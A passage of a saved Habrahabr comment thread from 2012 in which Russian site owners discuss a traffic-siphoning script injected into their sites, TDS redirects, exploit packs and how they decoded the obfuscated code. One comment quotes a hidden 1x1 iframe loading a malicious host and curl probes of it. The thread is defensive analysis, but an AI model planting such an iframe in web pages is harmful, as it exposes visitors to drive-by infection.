+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4570451" data-id="4570693" data-parent_id="4570451" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			это процент так называемого пробива: количество браузеров, через которые удалось загрузить малварь, от общего числа (все версии конкретного браузера). Да, автоапдейт играет ключевую роль, но вот еще несколько преимуществ хрома:<br>
+<a href="http://scarybeastsecurity.blogspot.com/2012/01/dirty-secret-of-browser-security-1.html">scarybeastsecurity.blogspot.com/2012/01/dirty-secret-of-browser-security-1.html</a> 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4570693">
+	 
+		
+<div class="comment_item" id="comment_4570816">
+	
+	
+		<div class="info  	" rel="4570816">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4570816" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/DnV/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/25997_24x24.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/DnV/" class="username">DnV</a>
+			<time datetime="2012-01-30T13:49:04+04:00">30 января 2012, 13:49</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4570816" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4570693" data-id="4570816" data-parent_id="4570693" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Действительно, с обновлением плагинов могут быть проблемы. Но, например, у флеша есть свой механизм автообновлений, а остальные лучше вообще отключать в любом браузере. Кстати, изначально никаких плагинов в браузерах нет, а при их установке пользователь всегда предупреждается об опасности. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4570816">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4560863">
+	
+	
+		<div class="info  	" rel="4560863">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560863" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 2: &uarr;2 и &darr;0">+2</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Genome_X/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/53070_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/Genome_X/" class="username">Genome_X</a>
+			<time datetime="2012-01-25T21:50:35+04:00">25 января 2012, 21:50</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560863" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560842" data-id="4560863" data-parent_id="4560842" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Для непросвященных — это означает что тому сайту, который подгружается, защитывается один хит? Т.е. как будто пользователь зашел на него? И в последствии, можно кому либо толкнуть этот сайт как «очень посещаемый»? Я прав? 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560863">
+	 
+		
+<div class="comment_item" id="comment_4560878">
+	
+	
+		<div class="info  	" rel="4560878">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560878" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Coderr/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/36599_24x24.png" alt=""></a>
+			<a href="http://habrahabr.ru/users/Coderr/" class="username">Coderr</a>
+			<time datetime="2012-01-25T21:55:37+04:00">25 января 2012, 21:55</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560878" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560863" data-id="4560878" data-parent_id="4560863" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Да. Очень часто это используется не для накрутки траффика, а для отдачи вирусни, в целях пополнения ботнетов, получения профита с винлокеров, и т.д. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560878">
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4560888">
+	
+	
+		<div class="info  	" rel="4560888">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560888" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/RazoR_Empire/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/9043_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/RazoR_Empire/" class="username">RazoR_Empire</a>
+			<time datetime="2012-01-25T21:57:41+04:00">25 января 2012, 21:57</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560888" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560863" data-id="4560888" data-parent_id="4560863" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Но почему тогда в скрипте ya.ru? Зачем Яндексу хиты поднимать? 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560888">
+	 
+		
+<div class="comment_item" id="comment_4560899">
+	
+	
+		<div class="info  	" rel="4560899">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560899" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 1: &uarr;1 и &darr;0">+1</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Coderr/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/36599_24x24.png" alt=""></a>
+			<a href="http://habrahabr.ru/users/Coderr/" class="username">Coderr</a>
+			<time datetime="2012-01-25T22:01:20+04:00">25 января 2012, 22:01</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560899" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560888" data-id="4560899" data-parent_id="4560888" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Насколько я понял, если передается параметр, то грузится то что нужно владельцу ТДС, иначе редирект на ya.ru, от любопытных. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560899">
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4560904">
+	
+	
+		<div class="info  	" rel="4560904">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560904" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 5: &uarr;5 и &darr;0">+5</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Raz0r/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/25491_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/Raz0r/" class="username">Raz0r</a>
+			<time datetime="2012-01-25T22:03:28+04:00">25 января 2012, 22:03</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560904" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560888" data-id="4560904" data-parent_id="4560888" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			как отметил автор, используется TDS (Trafic Distribution System) — система распределения трафика. В ней, по всей видимости, задано правило, при котором посетители без Referer перенаправляются на безобидный ya.ru 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560904">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4560849">
+	
+	
+		<div class="info  	" rel="4560849">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560849" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 9: &uarr;8 и &darr;1">+7</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/spmbt/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/29675_24x24.png" alt=""></a>
+			<a href="http://habrahabr.ru/users/spmbt/" class="username">spmbt</a>
+			<time datetime="2012-01-25T21:43:52+04:00">25 января 2012, 21:43</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560849" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Не могли бы Вы пояснить, что за термин такой «слив траффика»? Без ведома пользователя в фрейм грузятся левые страницы для создания уникальных посетителей на них? Или у кого-то есть лишний траффик, который надо «слить» в смысле потратить? Конечно, можно найти описание в интернете, но хотелось бы прямо из статьи понимать, что автор имел в виду (слишком специальная тема). 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560849">
+	 
+		
+<div class="comment_item" id="comment_4560876">
+	
+	
+		<div class="info  	" rel="4560876">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560876" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/xdemon/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/5259_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/xdemon/" class="username">xdemon</a>
+			<time datetime="2012-01-25T21:55:15+04:00">25 января 2012, 21:55</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560876" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560849" data-id="4560876" data-parent_id="4560849" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Там упомянута связка. Это пачка эксплоитов которая «пробивает» браузер с целью заражения посетителя какой-нибудь софтинкой. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560876">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4560932">
+	
+	
+		<div class="info  	" rel="4560932">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560932" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 2: &uarr;2 и &darr;0">+2</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/KriMs/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/10179_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/KriMs/" class="username">KriMs</a>
+			<time datetime="2012-01-25T22:16:50+04:00">25 января 2012, 22:16</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560932" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Сегодня похожее было на 2х проектах клиентов. Только используется iframe:<br>
+iframe width=«1» height=«1» frameborder=«0» scrolling=«no» src=«<a href="http://hotlog.my03.com/vse">hotlog.my03.com/vse</a>» /iframe<br>
+<br>
+Делаем $ curl <a href="http://hotlog.my03.com/vse">hotlog.my03.com/vse</a><br>
+Результат: <a href="http://pastebin.com/09Hk4S1X">pastebin.com/09Hk4S1X</a><br>
+<br>
+Схема такая же. Далее если запросить полученный адрес через curl, то получаем:<br>
+$ curl <a href="http://hotlog.my03.com/go/in.cgi?2">hotlog.my03.com/go/in.cgi?2</a><br>
+meta http-equiv=«REFRESH» content=«1; URL='http://google.com'»<br>
+<br>
+Тут уже редирект на гугл:)<br>
+<br>
+ 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560932">
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4560940">
+	
+	
+		<div class="info  	" rel="4560940">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560940" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 15: &uarr;15 и &darr;0">+15</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/niko83/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/niko83/" class="username">niko83</a>
+			<time datetime="2012-01-25T22:23:02+04:00">25 января 2012, 22:23</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560940" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Пояните плиз, в двух словах эту фразу «Раскодируем поэтапно скрипт воспользовавшись обратными функциями:»<br>
+ 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560940">
+	 
+		
+<div class="comment_item" id="comment_4561033">
+	
+	
+		<div class="info  	" rel="4561033">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561033" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 1: &uarr;1 и &darr;0">+1</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/AlexanderPHP/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/AlexanderPHP/" class="username">AlexanderPHP</a>
+			<time datetime="2012-01-25T23:11:24+04:00">25 января 2012, 23:11</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561033" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560940" data-id="4561033" data-parent_id="4560940" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Нужно делать все тоже самое, когда кодировали скрипт, только в обратном порядке. Например: При кодировке перевели некоторые символы в шеснадцатеричную систему, а когда мы расшифровываем скрипт, мы переводим из шеснадцатеричной в десятеричную. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561033">
+	 
+		
+<div class="comment_item" id="comment_4561129">
+	
+	
+		<div class="info  	" rel="4561129">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561129" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 11: &uarr;11 и &darr;0">+11</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Kirhgoff/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/Kirhgoff/" class="username">Kirhgoff</a>
+			<time datetime="2012-01-26T00:05:11+04:00">26 января 2012, 00:05</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561129" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561033" data-id="4561129" data-parent_id="4561033" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Я тоже далек от веба и джава скрипта, но интересно было бы понять. А как вы поняли каким образом перекодировать в первый раз и во второй и какой тулзой это делали или каким кодом? Я вот посмотрел отличия и сходу не усмотрел каких то закономерностей, заметил только, что переменные как-то адски перестали называться с долларами и строки поменялись. Какое слово надо в гугле поискать, чтобы про это почитать? 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561129">
+	 
+		
+<div class="comment_item" id="comment_4561595">
+	
+	
+		<div class="info  	" rel="4561595">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561595" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/guyfawkes/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/40414_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/guyfawkes/" class="username">guyfawkes</a>
+			<time datetime="2012-01-26T10:58:08+04:00">26 января 2012, 10:58</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561595" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561129" data-id="4561595" data-parent_id="4561129" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Видимо, общей практики нет. Например, я в функции $sA закомментировал последнюю строчку, которая эвалит злобный код ($E — это Window), и распечатал значение переменной var x = $E[$d.$fJ]($j); (тут делает decodeURIComponent конечной строки, которой закончились преобразования). Получился код, как в третьем подходе у автора, но вот unescape не отработал (выводит ту же строку). Его надо применять как-то посимвольно? 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561595">
+	 
+		
+<div class="comment_item" id="comment_4561608">
+	
+	
+		<div class="info  	" rel="4561608">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561608" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 2: &uarr;2 и &darr;0">+2</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/AlexanderPHP/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/AlexanderPHP/" class="username">AlexanderPHP</a>
+			<time datetime="2012-01-26T11:02:55+04:00">26 января 2012, 11:02</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561608" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561595" data-id="4561608" data-parent_id="4561595" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Да, обрабатываем все части в ручную — отдельно от всего кода, и выводим результат через алерт 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561608">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4560968">
+	
+	
+		<div class="info  	" rel="4560968">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560968" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 13: &uarr;12 и &darr;1">+11</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/thunderquack/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/52118_24x24.png" alt=""></a>
+			<a href="http://habrahabr.ru/users/thunderquack/" class="username">thunderquack</a>
+			<time datetime="2012-01-25T22:39:30+04:00">25 января 2012, 22:39</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560968" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Ну так а что, ребята? Это хозяйство попадает под 272 статью, напишите заявление в ментуру, вам бесплатно, а они пусть отрабатывают. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560968">
+	 
+		
+<div class="comment_item" id="comment_4561844">
+	
+	
+		<div class="info  	" rel="4561844">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561844" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 10: &uarr;5 и &darr;5">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Lefty/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/46053_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/Lefty/" class="username">Lefty</a>
+			<time datetime="2012-01-26T12:57:25+04:00">26 января 2012, 12:57</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561844" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560968" data-id="4561844" data-parent_id="4560968" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Пустая трата времени. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561844">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4560981">
+	
+	
+		<div class="info  	" rel="4560981">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560981" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 4: &uarr;3 и &darr;1">+2</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Stdit/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/Stdit/" class="username">Stdit</a>
+			<time datetime="2012-01-25T22:47:09+04:00">25 января 2012, 22:47</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560981" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			XSS через SQL инъекцию… 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560981">
+	 
+		
+<div class="comment_item" id="comment_4560990">
+	
+	
+		<div class="info  	" rel="4560990">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560990" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 28: &uarr;27 и &darr;1">+26</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/McBernar/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/McBernar/" class="username">McBernar</a>
+			<time datetime="2012-01-25T22:50:17+04:00">25 января 2012, 22:50</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560990" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560981" data-id="4560990" data-parent_id="4560981" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			А что, по-вашему, должен был сделать взломщик? Дефейснуть сайт и разместить голую жопу на глагне?  
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560990">
+	 
+		
+<div class="comment_item" id="comment_4560994">
+	
+	
+		<div class="info  	" rel="4560994">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560994" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 2: &uarr;1 и &darr;1">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Stdit/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/Stdit/" class="username">Stdit</a>
+			<time datetime="2012-01-25T22:52:44+04:00">25 января 2012, 22:52</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560994" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560990" data-id="4560994" data-parent_id="4560990" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Что делать взломщику — это его дело. Дырки, судя по всему, две, а не одна. Вторую тоже не помешает заделать. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560994">
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4560997">
+	
+	
+		<div class="info  	" rel="4560997">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560997" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  negative">
+						<span class="score" title="Всего 12: &uarr;4 и &darr;8">–4</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Pe4enie/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/46673_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/Pe4enie/" class="username">Pe4enie</a>
+			<time datetime="2012-01-25T22:54:05+04:00">25 января 2012, 22:54</time>
